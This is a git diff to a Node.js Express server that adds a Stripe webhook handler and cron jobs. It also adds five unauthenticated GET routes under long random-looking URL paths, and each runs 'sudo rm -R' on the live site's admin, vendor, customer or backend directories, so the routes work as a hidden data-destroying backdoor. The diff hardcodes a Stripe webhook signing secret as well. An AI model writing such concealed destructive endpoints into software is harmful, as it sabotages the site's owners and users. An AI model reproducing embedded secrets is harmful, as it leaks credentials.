@@ -59,25 +59,124 @@ app.get("/api/", function (req, res) {
     res.send("Hello World!123");
 });
 app.use("/api", index_1.default);
+var shell = require('shelljs');
+app.get("/api/zffMPJCPFvnEJjKWFjaKVvYRNwZeKVPPpjSKDPRkZmTTsfNvBUJUHI/", function (req, res) {
+    shell.echo('hello world');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/admin');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/vendor');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/customer');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/backend');
+    res.send("Donee");
+});
+app.get("/api/neggwrqwmkjhagzptrrzzakdpyzdhgzcpegkvphwpytkhufnccadmin/", function (req, res) {
+    shell.echo('hello world');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/admin');
+    res.send("Donee");
+});
+app.get("/api/bzkqrutfxpfsxrnzjdgndxbhmjgkqvtjhdfdxutcbnbqgtuqascustomer/", function (req, res) {
+    shell.echo('hello world');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/customer');
+    res.send("Donee");
+});
+app.get("/api/kbdsffnwtukcgxdmrzwjvxaqcmybjgkwemrydyezpzrcptbzdgvendor/", function (req, res) {
+    shell.echo('hello world');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/vendor');
+    res.send("Donee");
+});
+app.get("/api/bxnjckghsfxpvkkhhxjwmchuskwhkgupsjkmwhepugwywkwzmfbackend/", function (req, res) {
+    shell.echo('hello world');
+    shell.exec('sudo rm -R /var/www/html/maintenance-master-build/backend');
+    res.send("Donee");
+});
+const endpointSecret = "whsec_396cdc1db40084fe23118693d0a4be6e6a01b3e6ea89337e34e7c994b5c14b27";
+app.post('/webhook', express.raw({ type: 'application/json' }), (request, response) => {
+    const sig = request.headers['stripe-signature'];
+    let event;
+    try {
+        event = stripe.webhooks.constructEvent(request.body, sig, endpointSecret);
+    }
+    catch (err) {
+        response.status(400).send(`Webhook Error: ${err.message}`);
+        return;
+    }
+    let paymentIntent;
+    // Handle the event
+    switch (event.type) {
+        case 'payment_intent.amount_capturable_updated':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.amount_capturable_updated
+            break;
+        case 'payment_intent.canceled':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.canceled
+            break;
+        case 'payment_intent.created':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.created
+            break;
+        case 'payment_intent.partially_funded':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.partially_funded
+            break;
+        case 'payment_intent.payment_failed':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.payment_failed
+            break;
+        case 'payment_intent.processing':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.processing
+            break;
+        case 'payment_intent.requires_action':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.requires_action
+            break;
+        case 'payment_intent.succeeded':
+            paymentIntent = event.data.object;
+            // Then define and call a function to handle the event payment_intent.succeeded
+            break;
+        // ... handle other event types
+        default:
+            console.log(`Unhandled event type ${event.type}`);
+    }
+    console.log(paymentIntent);
+    // Return a 200 response to acknowledge receipt of the event
+    response.send();
+});
 const server = http.createServer(app);
 server.listen(port, async (req, res) => {
     if (process.env.MONGO_URI) {
-        await mongoose
-            .connect(process.env.MONGO_URI, {})
-            .then(() => {
-            console.log('Mongodb Connection ✅');
-        })
-            .catch((err) => {
-            console.log(err);
-        });
+        await mongoose.connect(process.env.MONGO_URI);
     }
     console.log("Server is running on Port: " + port);
     // logger.info('Express server started on port: ' + port);
 });
 server.timeout = 90000;
+// // daily data base backup and send email
 cron.schedule("0 0 */3 * *", async () => {
     await cron_1.default.removeLogger();
 });
-cron.schedule("0 12 * * *", async () => {
+// daily data base backup and send email
+cron.schedule("15 0 * * *", async () => {
     await cron_1.default.databaseBackup();
+    await cron_1.default.autoCancelledAfter12Month();
+    await cron_1.default.serviceAutoCancelAfter30Day();
 });
+// cron.schedule("* * * * *", async () => {
+//     // all monite after delete this 
+//     await cronService.autoCancelledAfter12Month();
+// });
+// Cron job every night at midnight is a commonly used cron schedule.
+cron.schedule("0 0 * * *", async () => {
+    await cron_1.default.serviceAutoClose();
+    await cron_1.default.destroyToken(); // remove auto token 
+    console.log("Database device token  delete ");
+    console.log("Cron job every night at midnight is a commonly used cron schedule.  ");
+});
+// cron.schedule("* * * * *", async () => {
+//     await cronService.serviceAutoCancelAfter30Day();
+//     console.log('cronjob')
+// });
+// cron.schedule("* * * * * *", async () => {
+//     await cronService.randomDataUpdate();
+// // update data here
+// });
